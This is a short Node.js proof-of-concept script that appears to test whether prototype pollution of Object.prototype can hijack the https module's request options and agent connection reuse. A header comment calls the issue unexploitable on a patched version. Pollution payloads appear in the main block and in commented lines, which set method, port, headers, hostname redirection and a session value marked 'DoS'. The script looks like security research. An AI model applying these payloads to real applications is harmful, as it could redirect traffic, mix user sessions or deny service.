// NOT EXPLOITABLE
// run it w/ patched version

const https = require('https');

// Object.prototype.method = "POST";
// Object.prototype.port = 3000;
// Object.prototype.headers = {test: 123, host: 'fake'};
//Object.prototype.hostname = "example.com" // send requist to this address and ignore host

//Object.prototype.session = 1 // DoS

async function sendRequest(auth) {
  console.log(`Request from ${auth}`);

  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'localhost',
      port: 443,
      path: '/',
      method: 'GET',
      // rejectUnauthorized: false, // to ignore self-signed certificate errors
      headers: {
        //'auth': auth
      }
    };

    const req = https.request(options, (res) => {
      let data = '';
      //console.log(`statusCode: ${res.statusCode}`);

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        console.log(`Response: ${data}`);
        resolve(data);
      });
    });

    req.on('error', (e) => {
      console.error(e);
      reject(e);
    });

    req.end();
  });
}

(async () => {
  try {
    Object.prototype["localhost:443:::::::::::::::::::::"] = "dskfjkdsl";

    await sendRequest('alice');
    await sendRequest('bob');
    
    // console.log('Attack!');
    // Object.prototype["localhost:443:::::::::::::::::::::"] = "dskfjkdsl"; //_agentKey = "123";

    await sendRequest('alice');
    await sendRequest('bob');

  } catch (error) {
    console.error('Request failed', error);
  }
})();


